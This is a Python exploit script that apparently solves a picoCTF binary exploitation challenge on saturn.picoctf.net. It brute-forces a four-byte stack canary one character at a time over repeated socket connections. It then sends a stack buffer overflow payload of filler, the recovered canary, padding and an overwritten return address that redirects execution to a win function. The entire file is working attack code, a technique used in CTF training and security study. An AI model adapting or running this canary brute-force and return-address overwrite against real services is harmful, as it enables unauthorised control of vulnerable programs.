import socket
import sys
import re
import select
import random
import string
import binascii

def main():
    MAX = 999999
    server_address = ("saturn.picoctf.net", 61120)
    winAddr = b"\x36\x93\x04\x08"
    l = 64
    buffer = "A"*l
    alphabet = string.ascii_letters + string.digits + "_"
    canary = ""
    pad_l = 16
    padding = "P" * pad_l

    print("Finding canary... please wait...")
    for i in range(4):
        for c in alphabet:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #print('connecting to %s port %s' % server_address, file=sys.stderr)
            sock.connect(server_address)
            data = socket_receive(sock)
            #print(data.decode("utf-8"))
            data = (str(l+i+1)+"\n").encode()
            socket_send(sock, data)
            #print(data.decode())
            data = socket_receive(sock)
            #print(data.decode("utf-8"))
            pwn_string = buffer+canary+c+"\n"
            socket_send(sock, pwn_string.encode())
            #print(pwn_string)
            data = socket_receive(sock)
            #print(data.decode("utf-8"))            
            if "Flag" in data.decode():
                canary = canary + c
                sock.close()
                break
            sock.close()

    print("Canary found: {}".format(canary))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #print('connecting to %s port %s' % server_address, file=sys.stderr)
    sock.connect(server_address)
    data = socket_receive(sock)
    print(data.decode("utf-8"))
    data = (str(l+4+pad_l+4)+"\n").encode()
    socket_send(sock, data)
    print(data.decode())
    data = socket_receive(sock)
    print(data.decode("utf-8"))
    pwn_string = (buffer+canary+padding).encode()+winAddr+b"\n"
    socket_send(sock, pwn_string)
    print(pwn_string)
    data = socket_receive(sock)
    print(data.decode())
    data = socket_receive(sock)
    print(data.decode())    
    sock.close()


def socket_receive(sock):
    data = b''
    try:
        amount_expected = 4096
        ready = select.select([sock], [], [], 2)
        data = sock.recv(amount_expected)
    finally:
        return data

def socket_send(sock, data):
    try:
        sock.send(data)
    except:
        print("Couldn't send data")


if __name__ == "__main__":
    main()